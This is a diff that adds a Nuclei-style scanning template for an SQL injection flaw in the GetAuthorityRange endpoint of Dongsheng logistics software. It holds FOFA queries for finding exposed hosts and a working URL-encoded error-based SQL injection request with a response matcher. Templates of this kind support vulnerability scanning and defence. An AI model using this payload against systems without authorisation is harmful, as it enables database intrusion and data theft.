@@ -1,0 +1,26 @@
+id: dongsheng-logistics-getauthorityrange-sqli
+
+info:
+  name: 东胜物流软件 GetAuthorityRange接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="FeeCodes/CompanysAdapter.aspx"||body="dhtmlxcombo_whp.js"||body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+      
+      东胜物流软件系统中GetAuthorityRange接口存在SQL注入漏洞，攻击者可通过构造恶意输入参数绕过输入验证机制，导致数据库执行任意SQL代码。该漏洞源于对用户提交的参数未实施充分的过滤和转义处理，可能引发敏感数据泄露、数据篡改或权限提升等安全风险。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    GET /CommMng/BasicDataRef/GetAuthorityRange?modName=-1&USERID=1%27%29%20AND%202619%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28UNICODE%28SQUARE%28NULL%29%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%20aKIF HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 'qvjqzq'
